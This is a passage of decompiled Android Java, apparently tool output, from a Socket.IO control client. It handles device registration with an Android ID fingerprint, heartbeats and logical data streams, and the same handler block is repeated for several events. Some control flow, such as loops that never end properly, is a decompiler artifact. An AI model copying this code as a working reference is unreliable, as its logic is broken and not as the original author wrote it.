                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i14 = 0;
                                int i15 = 0;
                                bArr = null;
                                while (true) {
                                    if (i14 < length) {
                                        Object obj3 = objArr[i14];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i15++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i14++;
                                    } else if (i15 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i13 = 10;
            sVarA.c("server:busy", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i13) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i14 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i14, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar14 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar14), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i14, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar15 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar15), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i15 = 0;
                                int i16 = 0;
                                bArr = null;
                                while (true) {
                                    if (i15 < length) {
                                        Object obj3 = objArr[i15];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i16++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i15++;
                                    } else if (i16 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i14 = 1;
            sVarA.c("media:demand", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i14) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
